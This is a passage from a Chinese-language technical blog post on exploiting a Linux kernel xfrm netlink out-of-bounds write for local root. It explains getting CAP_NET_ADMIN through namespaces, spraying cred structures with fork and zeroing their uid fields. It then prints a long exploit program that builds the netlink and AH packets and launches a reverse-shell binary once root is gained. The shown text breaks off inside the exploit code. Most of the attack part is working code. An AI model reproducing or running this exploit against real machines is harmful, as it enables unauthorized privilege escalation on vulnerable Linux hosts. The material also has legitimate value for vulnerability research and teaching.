<p>而<code>Family Header</code>需要到对应的处理函数中找，以<code>xfrm_add_sa</code>为例，其调用<code>nlmsg_data</code>函数的赋值变量类型为<code>xfrm_usresa_info</code>，即为<code>Family Header</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xfrm_usersa_info</span> *<span class="title">p</span> = <span class="title">nlmsg_data</span>(<span class="title">nlh</span>);</span></span><br></pre></td></tr></table></figure>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="权限限制"><a href="#权限限制" class="headerlink" title="权限限制"></a>权限限制</h3><p>所谓权限限制即是在上文中提到的<code>netlink_net_capable(skb, CAP_NET_ADMIN)</code>检查，所需为<code>CAP_NET_ADMIN</code>权限。但在<code>Linux</code>操作系统中存在命名空间这样的权限隔离机制，在每一个<code>NET</code>沙箱中，非<code>ROOT</code>进程可以具有<code>CAP_NET_ADMIN</code>权限。查看命名空间开启的方式为<code>cat /boot/config* | grep CONFIG_USER_NS</code>，若为「y」，则启用了命名空间。</p>
<p>而对于上述限制的绕过有两种方法，一是使用<code>setcap</code>命令为<code>EXP</code>赋予权限，即执行<code>sudo setcap cap_net_raw,cap_net_admin=eip ./exp</code>。二是仿照<a href="https://github.com/ret2p4nda/linux-kernel-exploits/tree/master/2017/CVE-2017-7308" target="_blank" rel="noopener">CVE-2017-7308</a>中设置<code>namespace sandbox</code>，但注意此时无法利用<code>getuid</code>来判断是否为<code>root</code>用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">void setup_sandbox() &#123;</span><br><span class="line">	int real_uid = getuid();</span><br><span class="line">	int real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        if (unshare(CLONE_NEWUSER) != 0) &#123;</span><br><span class="line">		perror(&quot;[-] unshare(CLONE_NEWUSER)&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        if (unshare(CLONE_NEWNET) != 0) &#123;</span><br><span class="line">		perror(&quot;[-] unshare(CLONE_NEWUSER)&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (!write_file(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;)) &#123;</span><br><span class="line">		perror(&quot;[-] write_file(/proc/self/set_groups)&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	if (!write_file(&quot;/proc/self/uid_map&quot;, &quot;0 %d 1\n&quot;, real_uid))&#123;</span><br><span class="line">		perror(&quot;[-] write_file(/proc/self/uid_map)&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	if (!write_file(&quot;/proc/self/gid_map&quot;, &quot;0 %d 1\n&quot;, real_gid)) &#123;</span><br><span class="line">		perror(&quot;[-] write_file(/proc/self/gid_map)&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cpu_set_t my_set;</span><br><span class="line">	CPU_ZERO(&amp;my_set);</span><br><span class="line">	CPU_SET(0, &amp;my_set);</span><br><span class="line">	if (sched_setaffinity(0, sizeof(my_set), &amp;my_set) != 0) &#123;</span><br><span class="line">		perror(&quot;[-] sched_setaffinity()&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (system(&quot;/sbin/ifconfig lo up&quot;) != 0) &#123;</span><br><span class="line">		perror(&quot;[-] system(/sbin/ifconfig lo up)&quot;);</span><br><span class="line">		exit(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数据包构造"><a href="#数据包构造" class="headerlink" title="数据包构造"></a>数据包构造</h3><p>本漏洞属于一个利用条件比较宽松的漏洞。首先，<code>xfrm_replay_state_esn</code>是一个变长的数据结构，而其长度可以由用户输入的<code>bmp_len</code>来控制，并由<code>kzalloc</code>申请<code>bmp_len *4 + 0x18</code>大小的内存块。其次，越界读写可以每次写1<code>bit</code>大小的数据，同时也可以将<code>(replay_windows -1)&gt;&gt;5</code>比特大小的内存块清空。</p>
<p>并且<code>cred</code>结构体的申请是通过<code>prepare_creds</code>中的<code>new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</code>得到的，但在调试中发现，本内核的<code>cred_jar</code>是<code>kmalloc-192</code>。</p>
<p><img src="https://wx2.sinaimg.cn/large/d9e4cccely1g099iiczvgj20yt0mgwl5.jpg" alt=""></p>
<p>根据内核分配使用的<code>slub</code>+伙伴算法可以知道，对于同一个<code>kmem_cache</code>分配出来的内存块有一定概率是相邻。因此一种很取巧的思路，就是将<code>xfrm_replay_state_esn</code>结构体设置为<code>192(0xc0)</code>以内，以利用<code>kmalloc-192</code>进行分配，并利用<code>fork</code>新建大量进程，使申请大量<code>cred</code>，这样喷射之后有很大概率越界读写漏洞存在的位置之后就是一个<code>cred</code>结构体，这样利用之前提到过的置零一段内存的操作就可以将<code>cred</code>结构体中的部分成员<code>(uid gid等)</code>置零，从而对该进程提权，并通过反弹<code>shell</code>就可以得到一个<code>root</code>权限的<code>shell</code>。</p>
<p>因此对于数据包构造主要根据上述思路。</p>
<p><strong>xfrm_add_sa</strong></p>
<p>在触发<code>xfrm_add_sa</code>函数的数据包中，需要满足<code>128 &lt; bmp_len * 4 +0x18 &lt; 192</code>。并且需要参考之前源码分析中的各项<code>flag</code>及参数检查。</p>
<p><strong>xfrm_new_ae</strong></p>
<p>在触发<code>xfrm_new_ae</code>函数的数据包中，需要对<code>seq_hi</code>、<code>seq</code>及<code>replay_window</code>进行设定，<code>replay_window</code>即将要置零的长度大小，由于连续申请了两块大小相同的结构体，而置零的时候是从第一次申请的位置操作的，有可能出现二者相邻，因此需要将<code>replay_window</code>设置稍大一些。而<code>seq_hi</code>、<code>seq</code>两个数据需要结合之后发送的<code>ah</code>数据包中的<code>seq</code>参数，引导<code>xfrm_replay_advance_esn</code>走向置零<code>bmp[0]~bmp[n]</code>这个分支。</p>
<p><strong>AH数据包</strong></p>
<p><code>AH</code>数据包的要求即<code>spi</code>需要和之前申请<code>SA</code>的<code>spi</code>相同用于寻找<code>xfrm_state</code>，并且需要满足</p>
<p><code>diff &gt;= replay_esn-&gt;replay_window</code>，其中<code>diff</code>的数据由<code>xfrm_replay_state_esn</code>中的<code>seq</code>、<code>seq_hi</code>及<code>AH</code>的<code>seq</code>共同决定。还行需在后续单字节写的位置，将<code>cred</code>结构体中<code>usage</code>置回原值。</p>
<p>在<code>xfrm_replay_advance_esn</code>函数执行前后发现，相邻<code>cred</code>中的成员被置零。</p>
<p><img src="https://ws2.sinaimg.cn/large/d9e4cccely1g09aint3orj20qq0mzadz.jpg" alt="xfrm_replay_advance_esn函数执行前"></p>
<p><img src="https://wx2.sinaimg.cn/large/d9e4cccely1g09bwjx91qj20q90jftaz.jpg" alt=""></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/xfrm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD 4096</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_auth_hdr</span> &#123;</span></span><br><span class="line">	__u8	nexthdr;</span><br><span class="line">	__u8	hdrlen;</span><br><span class="line">	__be16	reserved;	<span class="comment">/* big endian */</span></span><br><span class="line">	__be32	spi;		<span class="comment">/* big endian */</span></span><br><span class="line">	__be32	seq_no;		<span class="comment">/* big endian */</span></span><br><span class="line">	__u8	auth_data[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fork_spary_n</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">unsigned</span> <span class="keyword">int</span> time)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> pid ;</span><br><span class="line">		pid = fork();</span><br><span class="line">		<span class="keyword">if</span>(pid ==<span class="number">0</span>)&#123;</span><br><span class="line">			sleep(time);</span><br><span class="line">			<span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] now get r00t\n"</span> );</span><br><span class="line">				system(<span class="string">"id"</span>);</span><br><span class="line">				system(<span class="string">"/home/p4nda/Desktop/reverse_shell"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_xfrm_socket</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">addr</span>;</span> </span><br><span class="line">	<span class="keyword">int</span> result = <span class="number">-1</span>,xfrm_socket;</span><br><span class="line">	xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);</span><br><span class="line">	<span class="keyword">if</span> (xfrm_socket&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad NETLINK_XFRM socket "</span>);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">    addr.nl_family = PF_NETLINK;  </span><br><span class="line">    addr.nl_pad    = <span class="number">0</span>;  </span><br><span class="line">    addr.nl_pid    = getpid();  </span><br><span class="line">    addr.nl_groups = <span class="number">0</span>;</span><br><span class="line">    result = bind(xfrm_socket, (struct sockaddr *)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">   	<span class="keyword">if</span> (result&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad bind "</span>);</span><br><span class="line">		close(xfrm_socket);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> xfrm_socket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_recvfd</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> recvfd=<span class="number">-1</span>;</span><br><span class="line">	recvfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH );</span><br><span class="line">	<span class="keyword">if</span> (recvfd&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad IPPROTO_AH socket "</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> recvfd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_sendfd</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sendfd=<span class="number">-1</span>,err;	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">	sendfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH );</span><br><span class="line">	<span class="keyword">if</span> (sendfd&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad IPPROTO_AH socket "</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(addr));</span><br><span class="line">	addr.sin_family = AF_INET;</span><br><span class="line">	addr.sin_port = htons(<span class="number">0x4869</span>);</span><br><span class="line">	addr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">	err = bind(sendfd, (struct sockaddr*)&amp;addr,<span class="keyword">sizeof</span>(addr));</span><br><span class="line">	<span class="keyword">if</span> (err&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad bind"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sendfd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dump_data</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"========================="</span>);</span><br><span class="line">    <span class="keyword">int</span> i ;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xfrm_add_sa</span><span class="params">(<span class="keyword">int</span> sock,<span class="keyword">int</span> spi,<span class="keyword">int</span> bmp_len)</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlhdr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">4096</span>,err;</span><br><span class="line">	<span class="keyword">char</span> *data;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;nladdr, <span class="number">0</span>, <span class="keyword">sizeof</span>(nladdr));</span><br><span class="line">	nladdr.nl_family = AF_NETLINK;</span><br><span class="line">	nladdr.nl_pid = <span class="number">0</span>;</span><br><span class="line">	nladdr.nl_groups = <span class="number">0</span>;</span><br><span class="line">	nlhdr = (struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(len));</span><br><span class="line">	<span class="built_in">memset</span>(nlhdr,<span class="number">0</span>,NLMSG_SPACE(len));</span><br><span class="line"></span><br><span class="line">	nlhdr-&gt;nlmsg_len = NLMSG_LENGTH(len);</span><br><span class="line">	nlhdr-&gt;nlmsg_flags = NLM_F_REQUEST;</span><br><span class="line">	nlhdr-&gt;nlmsg_pid = getpid();</span><br><span class="line">	nlhdr-&gt;nlmsg_type = XFRM_MSG_NEWSA;</span><br><span class="line"></span><br><span class="line">	data = NLMSG_DATA(nlhdr); </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_usersa_info</span> <span class="title">xui</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;xui,<span class="number">0</span>,<span class="keyword">sizeof</span>(xui));</span><br><span class="line">	xui.family = AF_INET;</span><br><span class="line">	xui.id.proto = IPPROTO_AH;</span><br><span class="line">	xui.id.spi = spi;</span><br><span class="line">	xui.id.daddr.a4 = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">	xui.lft.hard_byte_limit = <span class="number">0x10000000</span>;</span><br><span class="line">	xui.lft.hard_packet_limit = <span class="number">0x10000000</span>;</span><br><span class="line">	xui.lft.soft_byte_limit = <span class="number">0x1000</span>;</span><br><span class="line">	xui.lft.soft_packet_limit = <span class="number">0x1000</span>;</span><br><span class="line">	xui.mode = XFRM_MODE_TRANSPORT;</span><br><span class="line">	xui.flags = XFRM_STATE_ESN;</span><br><span class="line">	<span class="built_in">memcpy</span>(data,&amp;xui,<span class="keyword">sizeof</span>(xui));</span><br><span class="line"></span><br><span class="line">	data += <span class="keyword">sizeof</span>(xui);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> <span class="title">nla</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_algo</span> <span class="title">xa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;nla, <span class="number">0</span>, <span class="keyword">sizeof</span>(nla));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;xa, <span class="number">0</span>, <span class="keyword">sizeof</span>(xa));</span><br><span class="line">	nla.nla_len = <span class="keyword">sizeof</span>(xa) + <span class="keyword">sizeof</span>(nla);</span><br><span class="line">	nla.nla_type = XFRMA_ALG_AUTH;</span><br><span class="line">	<span class="built_in">strcpy</span>(xa.alg_name, <span class="string">"digest_null"</span>);</span><br><span class="line">	xa.alg_key_len = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(data, &amp;nla, <span class="keyword">sizeof</span>(nla));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(nla);</span><br><span class="line">	<span class="built_in">memcpy</span>(data, &amp;xa, <span class="keyword">sizeof</span>(xa));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(xa);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> <span class="title">rs</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;nla, <span class="number">0</span>, <span class="keyword">sizeof</span>(nla));</span><br><span class="line">	nla.nla_len =  <span class="keyword">sizeof</span>(nla)+<span class="keyword">sizeof</span>(rs) +bmp_len*<span class="number">8</span>*<span class="number">4</span>;</span><br><span class="line">	nla.nla_type = XFRMA_REPLAY_ESN_VAL;	</span><br><span class="line">	rs.replay_window = bmp_len;</span><br><span class="line">	rs.bmp_len = bmp_len;</span><br><span class="line">	<span class="built_in">memcpy</span>(data,&amp;nla,<span class="keyword">sizeof</span>(nla));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(nla);</span><br><span class="line">	<span class="built_in">memcpy</span>(data, &amp;rs, <span class="keyword">sizeof</span>(rs));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(rs);	</span><br><span class="line">	<span class="built_in">memset</span>(data,<span class="string">'1'</span>,bmp_len*<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	iov.iov_base = (<span class="keyword">void</span> *)nlhdr;</span><br><span class="line">	iov.iov_len = nlhdr-&gt;nlmsg_len;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">	msg.msg_name = (<span class="keyword">void</span> *)&amp;(nladdr);</span><br><span class="line">	msg.msg_namelen = <span class="keyword">sizeof</span>(nladdr);</span><br><span class="line">	msg.msg_iov = &amp;iov;</span><br><span class="line">	msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line"> 	<span class="comment">//dump_data(&amp;msg,iov.iov_len);</span></span><br><span class="line">	err = sendmsg (sock, &amp;msg, <span class="number">0</span>); </span><br><span class="line">	<span class="keyword">if</span> (err&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad sendmsg"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span 